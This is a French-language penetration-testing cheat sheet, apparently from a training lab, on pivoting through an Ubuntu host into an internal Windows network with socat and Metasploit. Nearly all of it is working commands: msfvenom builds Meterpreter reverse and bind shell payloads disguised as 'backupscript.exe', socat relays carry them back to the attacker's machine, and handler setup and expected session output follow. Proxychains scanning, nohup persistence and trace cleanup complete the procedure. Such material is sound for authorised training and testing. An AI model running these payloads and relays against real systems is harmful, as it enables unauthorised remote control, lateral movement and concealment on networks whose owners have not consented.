Le pivoting réseau via **Socat** et **Metasploit** permet d'établir des connexions entre des segments réseau isolés.

```mermaid
flowchart LR
    A[Machine Attaquant] -- 10.10.14.18 --> B[Pivot Ubuntu]
    B -- 172.16.5.129 --> C[Cible Windows]
```

> [!warning] 
> Le mode **fork** de **socat** est indispensable pour gérer plusieurs connexions simultanées.

> [!danger] 
> Attention aux règles de pare-feu sur l'hôte pivot (Ubuntu) qui pourraient bloquer le port 8080.

> [!info] 
> Vérifier la présence d'antivirus sur la cible Windows avant exécution du payload.

> [!note] 
> La stabilité du pivot dépend de la persistance du processus **socat** sur l'hôte intermédiaire.

## Reverse Shell avec Socat et Metasploit

### Génération de payload

Sur la machine d'attaque :

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 LPORT=8080 -f exe -o backupscript.exe
```

Le payload est configuré pour se connecter à l'adresse IP du pivot sur le port **8080**.

### Configuration du relais sur le pivot

Sur l'hôte intermédiaire (Ubuntu) :

```bash
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

Cette commande redirige le trafic entrant sur le port **8080** vers l'adresse IP de la machine d'attaque sur le port **80**.

### Configuration de Metasploit

Sur la machine d'attaque :

```bash
msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 80
run
```

### Exécution sur la cible

Sur la machine Windows :

```powershell
C:\backupscript.exe
```

Sortie attendue dans **Metasploit** :

```text
[*] Meterpreter session 1 opened (10.10.14.18:80 -> 127.0.0.1 ) at 2022-03-07 11:08:10 -0500
```

## Bind Shell avec Socat et Metasploit

### Génération de payload

Sur la machine d'attaque :

```bash
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443
```

### Configuration du relais sur le pivot

Sur l'hôte intermédiaire (Ubuntu) :

```bash
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

### Configuration de Metasploit

Sur la machine d'attaque :

```bash
msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set RHOST 10.129.202.64
set LPORT 8080
run
```

Sortie attendue dans **Metasploit** :

```text
[*] Meterpreter session 1 opened (10.10.14.18:46253 -> 10.129.202.64:8080 ) at 2022-03-07 12:44:44 -0500
```

## Vérification de la connectivité (ping/nmap via pivot)

Une fois le pivot établi, il est crucial de valider l'accès au réseau interne. Si vous utilisez **Metasploit**, utilisez le module `autoroute` pour router le trafic, puis testez la connectivité :

```bash
# Dans meterpreter
run autoroute -s 172.16.5.0/24
background

# Utilisation de nmap via le pivot (via proxychains)
proxychains nmap -sT -Pn -p 445 172.16.5.129
```

## Utilisation de ProxyChains pour les outils non-Metasploit

Pour utiliser des outils comme **nmap**, **sqlmap** ou **smbclient** à travers le pivot, configurez `/etc/proxychains.conf` :

```text
[ProxyList]
socks5 127.0.0.1 1080
```

Lancez ensuite vos outils avec le préfixe `proxychains` :

```bash
proxychains nmap -sT -sV -p 80,445 172.16.5.129
```

## Gestion de la persistance du pivot

Pour éviter la perte du pivot lors d'une déconnexion SSH, utilisez `nohup` ou `screen`/`tmux` sur l'hôte intermédiaire :

```bash
# Lancement en arrière-plan avec nohup
nohup socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80 > /dev/null 2>&1 &
```

## Nettoyage des traces (suppression des fichiers/processus)

Il est impératif de nettoyer les artefacts après l'opération de **Pivoting** :

```bash
# Identifier le PID du processus socat
ps aux | grep socat

# Terminer le processus
kill <PID>

# Supprimer le payload déposé
rm /tmp/backupscript.exe
```

## Commandes utiles

| Commande | Utilité |
| :--- | :--- |
| **sessions -i** <ID> | Reprendre une session **Meterpreter** |
| **jobs** | Vérifier si **socat** tourne sur Ubuntu |
| **run autoroute -p** | Voir les routes actives dans **Metasploit** |
| **socat -d -d TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80** | Mode débogage de **socat** |

La gestion du **Pivoting** nécessite une compréhension fine des flux réseau, souvent couplée à des techniques de **Linux Post-Exploitation** et de **Windows** administration. Pour des outils ne supportant pas nativement le proxying, l'utilisation de **ProxyChains** est recommandée.